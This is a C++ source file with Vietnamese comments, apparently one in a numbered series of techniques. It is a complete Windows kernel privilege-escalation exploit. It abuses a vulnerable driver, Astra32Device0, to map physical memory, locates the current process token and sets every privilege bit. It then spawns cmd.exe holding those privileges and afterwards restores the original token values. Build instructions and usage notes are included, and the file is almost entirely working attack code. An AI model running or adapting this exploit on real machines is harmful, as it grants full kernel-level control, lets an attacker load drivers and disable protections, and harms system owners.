/*
 * 2_priv_escalate.cpp — Bật toàn bộ privilege trong _TOKEN của tiến trình hiện tại
 *
 * Ý tưởng:
 *   Mỗi token có struct _SEP_TOKEN_PRIVILEGES tại offset +0x40:
 *     +0x40  Present (uint64) — bitmask các privilege token có thể có
 *     +0x48  Enabled (uint64) — bitmask các privilege đang bật
 *     +0x50  EnabledByDefault
 *   Bằng cách set Present = Enabled = 0xFFFFFFFFFFFFFFFF, ta bật hết
 *   64 privilege (SeDebug, SeLoadDriver, SeTcb, SeAssignPrimaryToken, ...).
 *   Không cần swap token, không cần tạo process mới với token SYSTEM.
 *
 * Dùng khi nào:
 *   Muốn có SeLoadDriverPrivilege để load driver, SeDebugPrivilege để
 *   OpenProcess vào process khác, v.v. — mà không cần SYSTEM shell đầy đủ.
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:2_priv_escalate.exe 2_priv_escalate.cpp ^
 *      /link /subsystem:console kernel32.lib advapi32.lib ntdll.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_MAP_PHYS   0x80002008u
#define IOCTL_READ_MSR   0x800020ECu
#define DEVICE_PATH      "\\\\.\\Astra32Device0"
#define IA32_LSTAR       0xC0000082u
#define KUSD_VA          0xFFFFF78000000000ULL
#define EX_FAST_REF_MASK 0xFULL

// _SEP_TOKEN_PRIVILEGES trong _TOKEN
#define TOKEN_PRIVS_PRESENT_OFF 0x40u  // uint64 bitmask — có thể có
#define TOKEN_PRIVS_ENABLED_OFF 0x48u  // uint64 bitmask — đang bật

static bool is_kptr(uint64_t v) { return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL; }

#pragma pack(push,1)
struct MAP_INPUT { uint32_t interface_type, bus_number; uint64_t physical_addr; uint32_t address_space, size; };
#pragma pack(pop)

struct Astra {
    HANDLE dev = INVALID_HANDLE_VALUE; uint64_t hint_hi = 0;
    bool open() {
        dev = CreateFileA(DEVICE_PATH, GENERIC_READ|GENERIC_WRITE,
                          FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (dev == INVALID_HANDLE_VALUE) printf("[-] Cannot open %s: %lu\n", DEVICE_PATH, GetLastError());
        return dev != INVALID_HANDLE_VALUE;
    }
    void close() { if (dev != INVALID_HANDLE_VALUE) { CloseHandle(dev); dev = INVALID_HANDLE_VALUE; } }
    bool read_msr(uint32_t idx, uint64_t *out) {
        uint8_t io[8] = {}; memcpy(io, &idx, 4); DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_READ_MSR, io, 4, io, 8, &ret, NULL)) return false;
        memcpy(out, io, 8); return true;
    }
    uintptr_t map_page(uint64_t phys_page) {
        MAP_INPUT inp = {}; inp.physical_addr = phys_page; inp.size = 0x1000;
        DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_MAP_PHYS, &inp, sizeof(inp), &inp, sizeof(inp), &ret, NULL)) return 0;
        uint64_t lo = (uint64_t)(uint32_t)inp.interface_type; if (!lo) return 0;
        auto try_hi = [&](uint64_t hi) -> uintptr_t {
            uint64_t cand = (hi << 32) | lo; MEMORY_BASIC_INFORMATION mbi;
            return (VirtualQuery((LPCVOID)cand, &mbi, sizeof(mbi)) > 0 && mbi.State == MEM_COMMIT) ? (uintptr_t)cand : 0;
        };
        if (auto va = try_hi(hint_hi)) return va;
        for (uint64_t hi = 0; hi < 0x8000; hi++) { if (hi == hint_hi) continue; if (auto va = try_hi(hi)) { hint_hi = hi; return va; } }
        return 0;
    }
    void unmap(uintptr_t va) { UnmapViewOfFile((LPCVOID)(va & ~(uintptr_t)0xFFF)); }
    static bool safe_copy(uintptr_t src, void *dst, size_t n) { SIZE_T rd = 0; return ReadProcessMemory(GetCurrentProcess(), (LPCVOID)src, dst, n, &rd) && rd == n; }
    bool read_phys(uint64_t addr, void *buf, size_t len) {
        auto *dst = (uint8_t *)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page = addr & ~(uint64_t)0xFFF; size_t off = (size_t)(addr & 0xFFF), chunk = std::min(len-pos, (size_t)(0x1000-off));
            uintptr_t va = map_page(page); if (!va) return false;
            bool ok = safe_copy(va+off, dst+pos, chunk); unmap(va); if (!ok) return false;
            pos += chunk; addr += chunk;
        }
        return true;
    }
    bool write_phys(uint64_t addr, const void *buf, size_t len) {
        auto *src = (const uint8_t *)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page = addr & ~(uint64_t)0xFFF; size_t off = (size_t)(addr & 0xFFF), chunk = std::min(len-pos, (size_t)(0x1000-off));
            uintptr_t va = map_page(page); if (!va) return false;
            memcpy((void*)(va+off), src+pos, chunk); unmap(va); pos += chunk; addr += chunk;
        }
        return true;
    }
    bool read_u32(uint64_t pa, uint32_t *v) { return read_phys(pa, v, 4); }
    bool read_u64(uint64_t pa, uint64_t *v) { return read_phys(pa, v, 8); }
    bool write_u64(uint64_t pa, uint64_t v) { return write_phys(pa, &v, 8); }
};

static bool virt_to_phys(Astra *d, uint64_t cr3, uint64_t va, uint64_t *pa) {
    auto idx = [&](int lvl) { return (va >> (12 + lvl*9)) & 0x1FF; };
    uint64_t e = 0;
    if (!d->read_u64((cr3 & 0x000FFFFFFFFFF000ULL) + idx(3)*8, &e) || !(e&1)) return false;
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(2)*8, &e) || !(e&1)) return false;
    if (e & 0x80) { *pa = (e & 0x000FFFFC0000000ULL) | (va & 0x3FFFFFFFULL); return true; }
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(1)*8, &e) || !(e&1)) return false;
    if (e & 0x80) { *pa = (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL); return true; }
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(0)*8, &e) || !(e&1)) return false;
    *pa = (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL); return true;
}
static bool vread(Astra *d, uint64_t cr3, uint64_t va, void *buf, size_t len) {
    auto *dst = (uint8_t *)buf;
    for (size_t pos = 0; pos < len; ) {
        size_t off = (size_t)(va & 0xFFF), chunk = std::min(len-pos, (size_t)(0x1000-off));
        uint64_t pa; if (!virt_to_phys(d, cr3, va, &pa)) return false;
        if (!d->read_phys(pa, dst+pos, chunk)) return false; pos += chunk; va += chunk;
    }
    return true;
}
static bool vread_u64(Astra *d, uint64_t cr3, uint64_t va, uint64_t *v) { return vread(d,cr3,va,v,8); }

static uint64_t find_cr3(Astra *d) {
    const uint64_t idx = (KUSD_VA >> 39) & 0x1FF;
    printf("[*] Scanning low 64 MB for CR3...\n");
    std::vector<uint64_t> cands;
    for (uint64_t pg = 0; pg < 0x4000000ULL; pg += 0x1000) {
        uint64_t e = 0; if (!d->read_u64(pg+idx*8, &e) || !(e&1)) continue;
        if ((e & 0x000FFFFFFFFFF000ULL) > 0x80000000ULL) continue; cands.push_back(pg);
    }
    printf("[*] %zu candidates, verifying...\n", cands.size());
    for (uint64_t cr3 : cands) {
        uint64_t pa; uint32_t v = 0;
        if (virt_to_phys(d, cr3, KUSD_VA, &pa) && d->read_u32(pa+0x26C, &v) && v == 10) return cr3;
    }
    return 0;
}
typedef NTSTATUS (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);
struct RTL_MOD { PVOID Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize, Flags; USHORT LoadOrderIdx,InitOrderIdx,LoadCount,NameOffset; CHAR FullName[256]; };
struct RTL_MODS { ULONG Count; RTL_MOD Mods[1]; };
static uint64_t get_nt_kbase() {
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;
    ULONG sz = 0x20000; RTL_MODS *buf = NULL; NTSTATUS st;
    do { free(buf); buf = (RTL_MODS *)malloc(sz); if (!buf) return 0;
         st = NtQSI(11, buf, sz, &sz);
    } while (st == (NTSTATUS)0xC0000004L);
    if (st) { free(buf); return 0; }
    uint64_t base = 0;
    for (ULONG i = 0; i < buf->Count; i++) {
        const char *fn = buf->Mods[i].FullName + buf->Mods[i].NameOffset;
        if (_stricmp(fn, "ntoskrnl.exe") == 0) { base = (uint64_t)(uintptr_t)buf->Mods[i].ImageBase; break; }
    }
    free(buf); return base;
}
static uintptr_t load_image(const char *n) { return (uintptr_t)LoadLibraryExA(n, NULL, DONT_RESOLVE_DLL_REFERENCES); }
static uint64_t export_rva(uintptr_t base, const char *name) {
    FARPROC p = GetProcAddress((HMODULE)base, name); return p ? (uint64_t)((uintptr_t)p - base) : 0;
}

struct EpOff { uint64_t pid, links, token; };
static EpOff detect_ep_offsets() {
    typedef NTSTATUS(NTAPI *fn)(PRTL_OSVERSIONINFOW);
    auto f = (fn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    RTL_OSVERSIONINFOW ov = {}; ov.dwOSVersionInfoSize = sizeof(ov); if (f) f(&ov);
    printf("[*] Build: %lu\n", ov.dwBuildNumber);
    if (ov.dwBuildNumber >= 26100) return {0x1D0, 0x1D8, 0x248};
    return {0x440, 0x448, 0x4B8};
}
static bool find_eprocess(Astra *d, uint64_t cr3, uint64_t nt_kbase, uintptr_t nt_disk,
                           const EpOff &ep, uint32_t tgt_pid, uint64_t *sys_ep, uint64_t *tgt_ep) {
    uint64_t rva = export_rva(nt_disk, "PsInitialSystemProcess"); if (!rva) return false;
    uint64_t se = 0; if (!vread_u64(d,cr3,nt_kbase+rva,&se)||!is_kptr(se)) return false;
    uint64_t spid = 0; vread_u64(d,cr3,se+ep.pid,&spid); if (spid!=4) return false;
    *sys_ep = se; if (tgt_pid==4) { *tgt_ep=se; return true; }
    uint64_t head=0,flink=0;
    if (!vread_u64(d,cr3,se+ep.links+8,&head)||!is_kptr(head)) return false;
    if (!vread_u64(d,cr3,head,&flink)) return false;
    for (int i=0; i<4096 && flink!=head; i++) {
        uint64_t ep_va=flink-ep.links, pid=0;
        if (vread_u64(d,cr3,ep_va+ep.pid,&pid) && (uint32_t)pid==tgt_pid) { *tgt_ep=ep_va; return true; }
        uint64_t nxt=0; if (!vread_u64(d,cr3,flink,&nxt)||!is_kptr(nxt)) break; flink=nxt;
    }
    return false;
}

// ════════════════════════════════════════════════════════════
//   In ra tên các privilege từ bitmask để dễ đọc
// ════════════════════════════════════════════════════════════
static void print_privs(uint64_t mask) {
    static const char *names[] = {
        "SeCreateToken","SeAssignPrimaryToken","SeLockMemory","SeIncreaseQuota",
        "SeMachine","SeTcb","SeSecurity","SeTakeOwnership",
        "SeLoadDriver","SeSystemProfile","SeSystemtime","SeProfileSingleProcess",
        "SeIncreaseBasePriority","SeCreatePagefile","SeCreatePermanent","SeBackup",
        "SeRestore","SeShutdown","SeDebug","SeAudit",
        "SeSystemEnvironment","SeChangeNotify","SeRemoteShutdown","SeUndock",
        "SeSyncAgent","SeEnableDelegation","SeManageVolume","SeImpersonate",
        "SeCreateGlobal","SeTrustedCredManAccess","SeRelabel","SeIncreaseWorkingSet",
        "SeTimeZone","SeCreateSymbolicLink","SeDelegateSessionUserImpersonate"
    };
    for (int i = 0; i < 35; i++)
        if (mask & (1ULL << i)) printf("      bit%02d: %s\n", i, names[i]);
}

// ════════════════════════════════════════════════════════════
//   main
// ════════════════════════════════════════════════════════════
int main() {
    printf("\n=== Technique 2: Enable All Token Privileges ===\n\n");

    Astra drv; if (!drv.open()) return 1;
    printf("[+] ASTRA64 device opened\n");

    uint64_t cr3 = find_cr3(&drv);
    if (!cr3) { printf("[-] CR3 not found\n"); return 1; }
    printf("[+] CR3   = 0x%llX\n", (unsigned long long)cr3);

    uint64_t nt_kbase = get_nt_kbase();
    if (!nt_kbase) { printf("[-] ntoskrnl not found via NtQSI\n"); return 1; }
    printf("[+] ntoskrnl = 0x%llX\n", (unsigned long long)nt_kbase);

    uintptr_t nt_disk = load_image("ntoskrnl.exe");
    if (!nt_disk) { printf("[-] LoadLibraryEx ntoskrnl.exe\n"); return 1; }

    EpOff ep = detect_ep_offsets();
    uint32_t my_pid = GetCurrentProcessId();
    printf("[*] Finding our EPROCESS (PID %u)...\n", my_pid);
    uint64_t sys_ep = 0, my_ep = 0;
    if (!find_eprocess(&drv, cr3, nt_kbase, nt_disk, ep, my_pid, &sys_ep, &my_ep)) {
        printf("[-] EPROCESS not found\n"); return 1;
    }
    printf("[+] Our EPROCESS = 0x%llX\n", (unsigned long long)my_ep);

    // Đọc EPROCESS.Token (physical) → lấy _TOKEN pointer
    // Token field là _EX_FAST_REF: 4 bit thấp là ref count, không phải địa chỉ thật
    uint64_t pa_tok_field = 0;
    if (!virt_to_phys(&drv, cr3, my_ep + ep.token, &pa_tok_field)) {
        printf("[-] Cannot translate Token field\n"); return 1;
    }
    uint64_t tok_ref = 0; drv.read_u64(pa_tok_field, &tok_ref);
    uint64_t tok_ptr = tok_ref & ~EX_FAST_REF_MASK;  // xóa 4 bit thấp → địa chỉ _TOKEN
    if (!is_kptr(tok_ptr)) { printf("[-] Token pointer invalid: 0x%llX\n", (unsigned long long)tok_ptr); return 1; }
    printf("[+] _TOKEN @ 0x%llX\n", (unsigned long long)tok_ptr);

    // Lấy PA của Present và Enabled trong _TOKEN.Privileges
    uint64_t pa_present = 0, pa_enabled = 0;
    if (!virt_to_phys(&drv, cr3, tok_ptr + TOKEN_PRIVS_PRESENT_OFF, &pa_present) ||
        !virt_to_phys(&drv, cr3, tok_ptr + TOKEN_PRIVS_ENABLED_OFF, &pa_enabled)) {
        printf("[-] Cannot translate Privileges fields\n"); return 1;
    }

    // Đọc giá trị hiện tại
    uint64_t old_present = 0, old_enabled = 0;
    drv.read_u64(pa_present, &old_present);
    drv.read_u64(pa_enabled, &old_enabled);
    printf("\n[*] Before:\n");
    printf("    Present = 0x%016llX\n", (unsigned long long)old_present);
    printf("    Enabled = 0x%016llX\n", (unsigned long long)old_enabled);
    print_privs(old_enabled);

    // Set toàn bộ privilege
    drv.write_u64(pa_present, 0xFFFFFFFFFFFFFFFF);
    drv.write_u64(pa_enabled, 0xFFFFFFFFFFFFFFFF);

    uint64_t new_present = 0, new_enabled = 0;
    drv.read_u64(pa_present, &new_present);
    drv.read_u64(pa_enabled, &new_enabled);
    printf("\n[+] After:\n");
    printf("    Present = 0x%016llX\n", (unsigned long long)new_present);
    printf("    Enabled = 0x%016llX\n", (unsigned long long)new_enabled);
    printf("\n[+] All 64 privileges enabled.\n");
    printf("    SeDebug, SeLoadDriver, SeTcb, SeBackup, SeRestore, ...\n\n");

    // Spawn shell — kế thừa token với đầy đủ privilege
    printf("[*] Spawning shell with all privileges...\n");
    STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi = {};
    char cmd[] = "cmd.exe";
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[+] cmd.exe spawned (PID %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }

    // Restore sau khi shell đã launch
    Sleep(1000);
    drv.write_u64(pa_present, old_present);
    drv.write_u64(pa_enabled, old_enabled);
    printf("[+] Privileges restored.\n");

    drv.close();
    return 0;
}
